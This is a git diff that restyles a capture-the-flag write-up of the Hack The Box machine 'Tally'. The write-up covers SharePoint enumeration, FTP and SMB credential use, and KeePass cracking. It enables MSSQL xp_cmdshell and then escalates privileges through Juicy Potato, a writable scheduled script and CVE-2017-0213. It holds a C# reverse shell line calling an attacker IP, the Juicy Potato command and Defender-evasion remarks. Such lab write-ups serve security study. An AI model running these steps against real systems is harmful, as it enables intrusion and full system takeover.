@@ -7,22 +7,22 @@ published: false
 ![](/assets/Tally/Tally.png)
 
 ## Summary
-- Tally is great box with multiple exploit paths for both initial access and privilege escalation.
-- Intially, we found a SharePoint site on port 80 which we enumerated to find a web page with a couple of interesting bits of information.
-- One: credentials for the listening FTP service.
-- Two: being intel about an HTML document to be uploaded to the FTP share for review by another user.
-- After successfully logging into FTP, we find an installer for a specific version of Firefox which was vulnerable to an RCE vulnerability.
-- Having confirmed that the victim was using that version, we planted a malicious HTML payload but failed to get code execution due to the inconsistency of the exploit.
-- Moving along, we go through the FTP share to find a KeePass database file which we crack open and gain creds for an SMB share.
-- On that share, we find a custom binary that contained credentials for the `sa` user on the running MSSQL instance.
-- After logging in using the `sqsh` command-line utility, we enabled the `xp_cmdshell` feature and were able to execute a reverse shell and get on the system as the `sarah` user.
-- Having gained access through MSSQL, we had the `SeImpersonatePrivilege` enabled which we easily exploited using Juicy Potato to escalate our privileges to `NT AUTHORITY\System`.
-- There was another unintended path for privesc using a modifiable PowerShell script on `sarah`'s desktop that was running as a scheduled task under the `Administrator` user.
-- We added our payload to that script and owned the box a second way.
-- A third path -which was the intended one- was to use CVE-2017-0213. We found the C++ PoC for it on GitHub but couldn't compile it at first due to an error.
-- We googled it and were able to build the exploit binary. However, it only worked when we used the x86 version in an interactive process.
-- We used Metasploit's multi-handler module to catch a standard shell and upgrade it to a Meterpreter.
-- And later migrated to a stable interactive process where we ran the binary to escalate our privleges to `NT Authority\System` for the 3rd time.
+- **Tally** is a great box with **multiple exploit paths** for both **initial access** as well as **privilege escalation.**
+- *Intially,* we found a **SharePoint site** on port 80 which we enumerated to find **a web page with a couple of interesting bits of information.**
+- **One: credentials for the listening FTP service.**
+- **Two:** being **intel** about an **HTML document** to be **uploaded to the FTP share for review** by another user.
+- *After successfully logging into FTP,* we find an **installer for a specific version of Firefox** which was **vulnerable to an RCE vulnerability.**
+- *Having confirmed that the victim was using that version,* we **planted a malicious HTML payload** but **failed to get code execution** due to the ***inconsistency of the exploit.***
+- *Moving along,* we went through the **FTP share** to find a **KeePass database file** which we crack open and gain **creds for an SMB share**.
+- *On that share,* we find a **custom binary** that **contained credentials** for the `sa` user on the running **MSSQL instance.**
+- *After logging in using the* `sqsh` *command-line utility,* we enabled the `xp_cmdshell` feature and were able to **execute a reverse shell** and get on the system as the `sarah` user.
+- *Having gained access through MSSQL,* we had the `SeImpersonatePrivilege` enabled which we easily **exploited using Juicy Potato** to escalate our privileges to `NT AUTHORITY\System`.
+- There was **another unintended path** for privesc using a **modifiable PowerShell script** that was on `sarah`'s desktop **running as a scheduled task** under the `Administrator` user.
+- We **added our payload to that script** and **owned the box a second way.**
+- A third path ***-which was the intended one-*** was using **CVE-2017-0213**. We found the **C++ PoC** for it **on GitHub** but couldn't compile it at first due to an error.
+- We **did some research** and were able to **build the exploit binary**. *However,* it only worked when we used the **x86 version** in an **interactive process**.
+- We used **Metasploit's multi-handler module** to **catch a standard shell** and **upgrade it to a Meterpreter.**
+- And **migrated to a stable interactive process** before running the binary to escalate our privleges to `NT Authority\System` for the 3rd time.
 
 ---
 
@@ -124,76 +124,76 @@ Host script results:
 ```
 
 `nmap` gives us a bunch of information:
-1. FTP port open
-2. There's a Microsoft SharePoint Instance on port 80
-3. MSSQL on default port 1433
-4. WinRM available
-5. Another HTTP port there on 15567
+1. **FTP** port open
+2. There's a **Microsoft SharePoint** Instance on port 80
+3. **MSSQL** is there on default port 1433
+4. **WinRM** available
+5. Another **unknown HTTP port** there on 15567
 
 ## Quick FTP Check
-Before checking SharePoint, we pass by FTP to see if it's offering any freebies
+*Before checking SharePoint,* we **pass by FTP** looking for freebies :)
 
 ![](/assets/Tally/no-ftp-anon.jpg)
 
-anonymous login wasn't allowed.
+**anonymous login** wasn't allowed.
 
 ## Enumerating Sharepoint
-Checking the website, we get redirected to `/_layouts/15/start.aspx#/default.aspx`
+*Checking the website,* we get redirected to `/_layouts/15/start.aspx#/default.aspx`
 
 ![](/assets/Tally/sharepoint-home-page.jpg)
 
-To enumerate SharePoint, we needed a wordlist for its web directories.
+*To enumerate SharePoint,* we needed a **wordlist** for its web directories.
 
-This [one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt) from the Seclists repo was good.
+This [one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt) from the **SecLists repo** seemed good.
 
-We launched `gobuster` specifying the `--timeout` flag to 60 seconds since SharePoint was very slow :/
+We launched `gobuster` specifying the `--timeout` flag to **60 seconds** since **SharePoint was very slow :/**
 
 ![](/assets/Tally/gobuster.jpg)
 
-Out of the many pages, one was special: `/_layouts/15/viewlsts.aspx`
+*Out of the many pages,* one was special: `/_layouts/15/viewlsts.aspx`
 
 ![](/assets/Tally/sharepoint-file-list.jpg)
 
-The "Documents" list had something interesting
+The **"Documents"** list had something interesting
 
 ![](/assets/Tally/documents-sub-site.jpg)
 
-When we opened the file we found ourselves a password :)
+When we opened the file we found ourselves a **password :)**
 
 ![](/assets/Tally/ftp-details-document.jpg)
 
-the "Site Pages" list also had something
+the **"Site Pages"** list also had something
 
 ![](/assets/Tally/site-pages-list.jpg)
 
-a lot of information here
+**a lot of information there**
 
 ![](/assets/Tally/migration-update-note.jpg)
 
-- we got 4 usernames: `rahul`, `ftp_user`, `sarah` & `tim`
-- we now know `rahul` is expected to put an `index.html` file in the "Intranet" folder which either `sarah` or `tim` will open.
+- we got 4 **usernames:** `rahul`, `ftp_user`, `sarah` & `tim`
+- we now know `rahul` is ***expected to put*** an `index.html` file up on the `Intranet` folder on the FTP share which either `sarah` or `tim` will open.
 
-This is could very well be a client-side attack vector.
+This is could very well be a **client-side attack vector.**
 
-but let's first test those credentials against both SMB and FTP
+but let's first **test those credentials** against both **SMB and FTP**
 
 ![](/assets/Tally/smb-worked-for-ftp-user.jpg)
 
-SMB worked, but there were no permissions over any shares.
+**SMB worked**. but there were **no permissions over any shares.**
 
 ![](/assets/Tally/no-shares-available.jpg)
 
-Enumerating local users with the `--users` flag failed.
+**Enumerating local users** with the `--users` flag failed.
 
 ![](/assets/Tally/user-enumeration.jpg)
 
-But RID brute-forcing worked and got us every user on the box. They might come in handy.
+But **RID brute-forcing** worked and got us **every user on the box**. This might come in handy.
 
 ![](/assets/Tally/user-enumeration-rid-brute.jpg)
 
-But that was it for SMB.
+But **that was it** for SMB.
 
-We then tested all our creds with FTP and found the `ftp_user` valid as expected.
+We then **tested all our creds with FTP** and found the `ftp_user` valid as expected.
 
 ![](/assets/Tally/ftp-access-confirmed-hydra.jpg)
 
@@ -201,43 +201,43 @@ We then tested all our creds with FTP and found the `ftp_user` valid as expected
 
 ![](/assets/Tally/ftp-directories.jpg)
 
-After browsing the share and finding a lot of files/folders there, we decided to download it for speed and to leverage tools like `find` for search and what not.
+*After* ***browsing the share*** and ***finding a lot of files/folders there,*** we decided to **download it** for **speed** and **to leverage tools like** `find` **for search and what not.**
 
-we can do so with `wget`'s `-m` flag (for mirroring).
+we can do so with `wget`'s `-m` flag ***(for mirroring).***
 
 ```bash
 wget -m ftp://ftp_user:'UTDRSCH53c"$6hys'@tally
 ```
 
-while browsing the contents, we found a KeePass file in `tim`'s folder.
+*while browsing the contents,* we found a **KeePass file** in `tim`'s folder.
 
 ![](/assets/Tally/keepass-file-found.jpg)
 
-we converted it to a hash using `keepass2john` and cracked it.
+we **converted it to a hash** using `keepass2john` and **cracked it.**
 
 ![](/assets/Tally/keepass-pass-cracked.jpg)
 
-we carried the .kdbx file over to our windows VM along with the KeePass program files that were on the share then ran the application.
+we carried the `.kdbx` file over **to our windows VM** along with the KeePass program files that were on the share then ran the application.
 
-Inside, we found a password for a share called ACCT (we saw that earlier when enumerating SMB)
+*Inside,* we found **a password for a share called ACCT** (*we saw that earlier when enumerating SMB*)
 
 ![](/assets/Tally/keepass-passwords.jpg)
 
-and another password that looks for a cisco product.
+and **another password** that is *most likely* for **a Cisco product.**
 
 ![](/assets/Tally/cisco-password.jpg)
 
-Automatically, we shuffle the usernames/passwords and spray
+*Automatically,* we **shuffle the usernames/passwords** and **spray**
 
 ![](/assets/Tally/spray-and-finance-share-access.jpg)
 
-The creds for the `finance` user worked and we got access to the ACCT share.
+The creds for the `finance` user worked and we **got access to the ACCT share.**
 
 ![](/assets/Tally/finance-share-access.jpg)
 
 
 ## Going through SMB
-We mounted the share and started browsing.
+We **mounted the share** and started looking at the contents.
 
 ```bash
 mount -t cifs -o 'username=Finance,password=Acc0unting' //tally/ACCT finance-smb/
@@ -245,22 +245,22 @@ mount -t cifs -o 'username=Finance,password=Acc0unting' //tally/ACCT finance-smb
 
 ![](/assets/Tally/mounting-the-smb-share.jpg)
 
-A custom binary called `tester.exe` was in `/zz_Migration/Binaries/New folder`
+A **custom binary** called `tester.exe` was in `/zz_Migration/Binaries/New folder`
 
 ![](/assets/Tally/tester-exe-found.jpg)
 
-when running `strings` against it, we found creds inside:
+*when running* `strings` *against it,* we found **creds** inside:
 
 ![](/assets/Tally/db-password-found.jpg)
 
 ## Getting a shell through MSSQL
-The creds worked when we connected to MSSQL on port 1433.
+The creds worked when we **connected to MSSQL** on port 1433 using the `sqsh` tool.
 
-However, to execute commands, we needed to enable the `xp_cmdshell` feature which was initially blocked.
+*However, to execute commands,* we needed to** enable** the `xp_cmdshell` feature which was **initially unavailable**.
 
-At first, it wouldn't get enabled for being set as an "advanced option".
+*At first,* it was set as an "`advanced option`".
 
-so we reconfigured the shell to "show advanced options" and could then re-enable `xp_cmdshell` using the commands below:
+so we **reconfigured the shell** to "`show advanced options`" and could then **re-enable** `xp_cmdshell` using the commands below:
 
 ```sql
 exec sp_configure 'show advanced options', '1'
@@ -270,37 +270,37 @@ reconfigure
 xp_cmdshell 'whoami'
 ```
 
-After running the `whoami` command, we find ourselves executing code as the `sarah` user.
+*After running the* `whoami` *command*, we find ourselves executing code as the `sarah` user.
 
 ![](/assets/Tally/enabling-xp-cmd-shell-mssql.jpg)
 
-Because, over time, the `xp_cmdshell` option kept getting automatically disabled, we set the MSSQL commands in a file for a bit of automation.
+Note: *because, over time,* *the* `xp_cmdshell` *option kept getting* ***automatically disabled***, we set the **MSSQL commands** in a file for a bit of automation.
 
-We added the code to re-enable it and do a PowerShell web request to execute a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) hosted on our server.
+We added the code to both **re-enable it** and issue a **PowerShell web request** to **execute** a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) hosted on our web server to streamline the process in case we lost our shell.
 
 ![](/assets/Tally/shell-as-sarah.jpg)
 
-We were now inside as `sarah`
+We were now inside and interacting as `sarah`
 
 ## Privesc Path #1: Abusing the SeImpersonatePrivilege
 
-Since we got in through MSSQL, we had the `SeImpersonatePrivilege` enabled.
+*Since we got in through* ***MSSQL,*** we had the `SeImpersonatePrivilege` enabled.
 
 ![](/assets/Tally/se-impersonate-enabled.jpg)
 
-That's ripe for exploitation using the well-known Juicy Potato exploit.
+That's **ripe for exploitation** using **Juicy Potato**.
 
-we download the binary from [Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`
+we **download the binary** from [Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`
 
-That exploit always gave me the best results when used with a single executable rather than passing arguments.
+*For me,* that exploit **always worked** when used with a **single executable** rather than **passing arguments**.
 
-Our choice is going to be a [C# reverse shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+**Our choice** is going to be a [C# reverse shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-because that shell is also good for bypassing Windows Defender which was enabled and hinted for in the `todo.txt` file on `sarah`'s desktop:
+because that shell is **also good for bypassing Windows Defender** which was ***enabled and hinted for*** in the `todo.txt` file on `sarah`'s desktop:
 
 ![](/assets/Tally/windows-defender-hint.jpg)
 
-we can confirm that with:
+we can **confirm** that with the PowerShell cmdlet:
 
 ```powershell
 Get-MpComputerStatus
@@ -308,23 +308,23 @@ Get-MpComputerStatus
 
 ![](/assets/Tally/real-time-protection-enabled.jpg)
 
-After getting the shell, we modify it with our IP and port
+*After getting the shell,* we **modify** it with our IP and port
 ```C#
 // SNIP //
 TcpClient client = new TcpClient("10.10.16.4", 9001)
 // SNIP //
 ```
 
-We then compile on the victim machine using the native .NET framework compiler
+We then **compile the code** on the victim machine using the **native .NET compiler**
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
 ```
 
-Note: the compilation errors weren't serious here
+**Note:** the **compilation errors** weren't serious here
 
 ![](/assets/Tally/compilin-csharp-rev.jpg)
 
-after running Juicy Potato with the shell to execute, it gave us back a reverse shell as `nt authority\system`
+*after running* **Juicy Potato** *with our* `rev.exe` *as an argument,* it connected back to us as `nt authority\system`
 
 ```
 jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
@@ -334,17 +334,17 @@ jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
 
 
 ## Privesc Path #2: Modifying the Scheduled PowerShell Script
-Also on `sarah`'s desktop, there was a Powershell script called `SPBestWarmup.ps1` and another XML file with the same name `SPBestWarmup.xml`
+*Also on* `sarah`*'s desktop,* there was a **Powershell script** called `SPBestWarmup.ps1` and **another XML file** with the same name `SPBestWarmup.xml`
 
 ![](/assets/Tally/spwarmup-scripts.jpg)
 
-when looking within at the XML file, we notice something:
+*when looking at the XML file,* we notice something:
 
 ![](/assets/Tally/spwarmup-xml-contents.jpg)
 
-these options indicate that this script is part of a scheduled task.
+**these options** indicate that **this script is part of a scheduled task.**
 
-To check if we can exploit this, We run a `Get-ACL` to find our permissions.
+*To check if we can exploit this,* we run a `Get-ACL` to **find our permissions** on it.
 
 ```powershell
 Get-ACL .\SPBestWarmup.ps1 | Select -Expand AccessToString
@@ -352,44 +352,44 @@ Get-ACL .\SPBestWarmup.ps1 | Select -Expand AccessToString
 
 ![](/assets/Tally/write-access-to-script.jpg)
 
-We have full control!
+**We have full control!**
 
-We went ahead and added a reverse shell to that script right away.
+We went ahead and **added a reverse shell** to that script right away.
 
-However, it was configured to run every hour. so we had to wait for it :S
+*However,* it was configured to run **every hour**. so *we had to wait for it :S*
 
-But eventually, we received a shell as `Administrator`
+*But eventually,* we **received a shell** as `Administrator`
 
 ![](/assets/Tally/shell-as-administrator.jpg)
 
 ## Privesc Path #3: CVE-2017-0213
-After taking over the machine using the above two ways, and looking at the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs), I found that this was the intended path.
+*After taking over the machine using the above two ways,* and looking at the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs), I found that this ***was the intended path.***
 
-The [source code](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) needed to be compiled in Visual Studio to get the binary.
+The [source code](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) was **to be compiled in Visual Studio.**
 
-without any modifications, we get a type error:
+*without any modifications,* we get a **type error:**
 
 ![](/assets/Tally/eop-cve-compile-error.jpg)
 
-On Google, we query with the error as well as the variable name to get accurate results
+*On Google,* we queried with **both the error as well as the variable name** to get **more relevant results**
 
 ![](/assets/Tally/google-stackoverflow.jpg)
 
-By coincidence, the first result happened to be for the exact exploit. Here was the solution:
+The **first result** happened to be **for the exact exploit**. Here was **the solution:**
 
 ![](/assets/Tally/exploit-error-fix.jpg)
 
-After applying the fix, we edited the `cmdline` variable and inserted our shell's path instead.
+*After applying the fix,* we edited the `cmdline` variable and **inserted our shell's path** instead.
 
-That's because the normal exploit behavior was to run a `cmd.exe` which is just a Proof of Concept
+That's because the **default exploit code ran**  `cmd.exe` which is **just a Proof of Concept.**
 
-We make sure to select the `x86` process architecture as the 64-bit version doesn't work :/
+We make sure to **select the x86 process architecture** (*the 64-bit version didn't work*)
 
 ![](/assets/Tally/cpp-build-succeeded.jpg)
 
-Running the exploit at this point didn't work.
+Running the exploit from a normal shell wouldn't do the trick.
 
-That's because it had to be run as an "interactive process".
+That's because this one has to be run from an "interactive process".
 
 To proceed, we must get a Meterpreter shell.
 
